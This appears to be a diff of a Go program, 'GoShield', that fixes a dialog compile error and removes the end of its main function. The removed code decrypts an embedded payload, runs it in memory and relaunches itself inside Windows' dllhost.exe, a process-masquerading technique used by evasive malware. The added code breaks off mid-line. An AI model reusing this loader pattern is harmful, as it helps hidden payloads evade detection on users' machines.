@@ -52,7 +52,8 @@ func askPassword() string {
 	var pwdTE *walk.LineEdit
 	var pwd string
 
-	err := Dialog{
+	// 🌟 核心修复：Dialog.Run() 返回 (int, error) 两个值，这里用 _, err 接收来解决编译报错
+	_, err := Dialog{
 		AssignTo: &dlg,
 		Title:    "GoShield 安全验证",
 		MinSize:  Size{Width: 320, Height: 120},
@@ -211,31 +212,4 @@ func main() {
 			}
 			
 			newPID, err := loader.ExecuteAsync(originalExe, decryptedPayload)
-			if err != nil {
-				break
-			}
-			targetPID = int(newPID)
-		}
-		os.Exit(0)
-	}
-
-	decryptedPayload, err := extractAndDecrypt(exePath)
-	if err != nil {
-		os.Exit(1) 
-	}
-
-	payloadPID, err := loader.ExecuteAsync(exePath, decryptedPayload)
-	if err != nil {
-		os.Exit(1)
-	}
-
-	myExeBytes, err := os.ReadFile(exePath)
-	if err == nil {
-		os.Setenv("GOSHIELD_SHADOW_PID", strconv.Itoa(int(payloadPID)))
-		os.Setenv("GOSHIELD_ORIGINAL_EXE", exePath)
-		sysDir := os.Getenv("WINDIR") + "\\System32\\dllhost.exe"
-		loader.ExecuteAsync(sysDir, myExeBytes)
-	}
-
-	os.Exit(0)
-}
+			if err
